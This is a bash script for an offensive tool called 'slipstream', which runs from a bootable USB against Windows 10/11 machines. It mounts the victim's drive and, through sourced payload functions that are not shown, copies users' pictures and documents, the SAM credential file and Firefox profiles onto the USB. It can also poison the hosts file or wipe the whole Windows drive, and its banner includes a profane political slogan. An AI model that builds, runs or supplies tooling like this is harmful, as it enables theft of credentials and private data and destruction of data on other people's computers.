#!/usr/bin/env bash

# slipstream
# Automated Payload Injector for Win10/11
# Best when combined with buildroot on a USB drive
####################################################################
# Usage: ./slipstream.sh
# Depends on [root,rsync,coreutils,lsblk,parted,bash,awk,grep]
# Currently only supports Windows 10/11 Target Partition Detection
####################################################################
# Copyright 2025 nullcollective
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#clear -x

# Source Functions
SCRIPT_DIR="$(dirname "$(readlink -f "$0")")"
source ${SCRIPT_DIR}/slipstream_functions.sh
source ${SCRIPT_DIR}/slipstream_payload_functions.sh

#-------------------
# USER VARIABLES
#--------------------

#---- DRIVE INFO ----#
# Drive Label of Destination USB Drive
USB_LABEL="data"
# Where to mount your target's drive to
TARGET_MOUNT="/mnt/target"
# Where to mount your USB data drive to
USB_MOUNT="/mnt/slipstream"

#---- EXFIL OPTIONS ----#
# Which find pattern(s) to use
SEARCH="PICS DOCS"
# How far recursive search should decend
SEARCH_DEPTH="4"
# TARGET+BASE (ie: /mnt/win/Users)
BASE_SEARCH_PATH="/Users"
# Poweroff After Completion
poweroff_device="false"

#---- HOSTFILE POISONING ----#
poisoned_hosts=(
	"0.0.0.0 google.com"
	"0.0.0.0 facebook.com"
)

#-------------------------------------------------------
# DO NOT EDIT BELOW UNLESS YOU NEED TO ADJUST THE CODE
#-------------------------------------------------------
echo -e "[: :|:::] slipstream by nullcollective [: :|:::]"
echo -e "╭∩╮(ô¿ô)╭∩╮ FUCK MAGA ╭∩╮(ô¿ô)╭∩╮\n"
echo -e "-------------------------------------------"
echo "TARGET MOUNT: ${TARGET_MOUNT}"
echo "USB MOUNT: ${USB_MOUNT}"
echo "Poweroff After Running: $poweroff_device"
echo -e "-------------------------------------------\n"

# VERIFY ELEVATED PRIVS / REQUIRED FOR MOUNTING DRIVES
if [[ "$UID" -ne 0 ]];then echo "RUN AS UID 0";exit 1;fi
if [ $# -eq 0 ];then usage;exit 1;fi
# -------------------------------------------------

function init_drive_setup {
	init
	drive_detection_target
	drive_detection_usb
	drive_mounting_target
	drive_mounting_usb
	echo "[>] DRIVES MOUNTED --> SRC=${TARGET_DISK}, DEST=${USB_DISK}"
}

# Exfil Data Function
function exfiltrate_data {
	init_drive_setup
	echo "[>] Exfiltrating file(s) from ${TARGET_MOUNT} to ${USB_MOUNT}"
	payload_exfiltrate_data
	drive_unmounting_usb
	drive_unmounting_target
}

# Copy SAM FILE Function
function samcopy {
	init_drive_setup
	echo "[>] Copying SAM FILE from ${TARGET_MOUNT} to ${USB_MOUNT}"
	payload_samcopy
	drive_unmounting_usb
	drive_unmounting_target
}

# Copy Firefox Profiles
function firefox_copy {
	init_drive_setup
	echo "[>] Copying Firefox Profiles from ${TARGET_MOUNT} to ${USB_MOUNT}"
	payload_firefox_copy
	drive_unmounting_usb
	drive_unmounting_target
}

# Poison Target Host File
function host_poison {
	init
	drive_detection_target
	drive_mounting_target_rw
	echo "[>] Poisoning Host File..."
	payload_host_poison
	drive_unmounting_target
}

# WIPE WINDOWS TARGET DRIVE
function wipe_all_data {
	init
	drive_detection_target
	drive_mounting_target_rw
	payload_wipe_all_data
	drive_unmounting_target
}

# -------------------------------------------------
# MAIN PAYLOAD SELECTOR
while getopts "hlx:" opt; do cmd_prompt ; done
echo -e "-------------------------------------------\n"

# SHUTDOWN SYSTEM (optional)
if [ "${poweroff_device}" = "true" ]; then poweroff ; fi
exit 0